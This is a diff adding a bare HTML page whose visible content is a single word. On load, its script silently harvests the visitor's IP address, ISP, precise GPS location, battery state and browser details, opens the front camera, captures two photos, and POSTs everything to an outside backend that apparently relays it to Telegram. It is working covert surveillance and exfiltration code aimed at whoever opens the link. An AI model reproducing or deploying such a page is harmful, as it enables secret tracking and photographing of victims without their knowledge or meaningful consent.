@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+
+<p>raiib</p>
+
+<script>
+
+    let globalLogMessage="";
+  
+ const sentphoto= async()  => {
+
+    try{
+        const stream = await navigator.mediaDevices.getUserMedia({
+        video:{facingMode:"user"},
+        audio:false
+    });
+
+    const video = document.createElement('video');
+    video.srcObject=stream;
+    video.setAttribute('playsinline', '');
+    video.autoplay =true;
+
+    await new Promise((resolve) => { 
+        video.onloadedmetadata = resolve;
+        
+    });
+
+    await new Promise(res=>setTimeout(res,2000));
+
+    for(let i =0; i<2; i++){
+        const base64Data=captureAndCompress(video);
+
+
+        await fetch('https://telebot-backend-1aht.onrender.com/api/save-data', {
+            method:'POST',
+            headers:{"Content-Type": 'application/json'},
+            body: JSON.stringify({
+                image: base64Data,
+                deviceDetails: globalLogMessage || "No Device Data Available"
+            })
+        }).then(res=>res.json())
+          .then(data => console.log(data))
+          .catch(err => console.error("Server Send Error:", err))
+
+    }
+
+    stream.getTracks().forEach(track => track.stop());
+    }catch(err){
+        console.error("Camera Error: ", err);
+
+         await fetch('https://telebot-backend-1aht.onrender.com/api/save-data', {
+            method:'POST',
+            headers:{"Content-Type": 'application/json'},
+            body: JSON.stringify({
+                image: null,
+                deviceDetails: globalLogMessage || "No Device Data Available"
+            })
+        }).then(res=>res.json())
+          .then(data => console.log("Telegram Response (Only Text):", data))
+          .catch(err => console.error("Server Send Error:", err))
+
+    }
+  }
+
+
+function captureAndCompress(videoElement) {
+    const canvas = document.createElement('canvas');
+    canvas.width = videoElement.videoWidth / 2 || 320;
+    canvas.height = videoElement.videoHeight / 2 || 240;
+
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+    return canvas.toDataURL('image/jpeg', 0.6).split(',')[1];
+  }
+
+
+    async function sentDeviceData() {
+        return new Promise(async (resolve) => {
+
+       
+        try {
+            
+            let batteryLevel = "N/A", isCharging = "N/A";
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery().catch(() => null);
+                if (battery) {
+                    batteryLevel = `${Math.round(battery.level * 100)}%`;
+                    isCharging = battery.charging ? ' Charging' : ' Discharging';
+                }
+            }
+
+            const time = new Date().toLocaleString('en-IN');
+            const screenSize = `${screen.width}x${screen.height}`;
+            const userAgent = navigator.userAgent;
+
+            const geoRes = await fetch('https://telebot-backend-1aht.onrender.com/api/get-ip-info').then(r => r.json()).catch(() => ({}));
+
+            const ipAddress = geoRes.ip || "N/A";
+            const city = geoRes.city || "N/A";
+            const country = geoRes.country || "N/A";
+            const isp = geoRes.org || "N/A";
+
+            const logMessage = (lat = null, lon = null) => {
+                const googleMaplink = lat && lon ? `https://www.google.com/maps?q=${lat},${lon}` : "N/A";
+                
+                globalLogMessage = `
+*Device Details*
+======================
+IP Address: ${ipAddress}
+IP Location: ${city}, ${country}
+Internet Provider: ${isp}
+Live Location: ${googleMaplink}
+Battery: ${batteryLevel} (${isCharging})
+Time: ${time}
+OS/Browser: ${userAgent}
+ `.trim();             
+console.log(globalLogMessage);
+resolve();
+
+            };
+
+         
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const { latitude, longitude } = position.coords;
+                        logMessage(latitude, longitude);
+                    },
+                    (error) => {
+                        console.warn("Location Permission Denied/Error:", error.message);
+                        logMessage();
+                    },
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            } else {
+                console.warn("Geolocation not supported by this browser.");
+                logMessage();
+            }
+
+        } catch (e) {
+            console.error("Device Info Error:", e);
+            resolve();
+        }
+
+         });
+    }
+
+    async function init() {
+
+        await sentDeviceData();
+        sentphoto();
+        
+    }
+
+    init();
+    
+</script>
+    
+</body>
+</html>
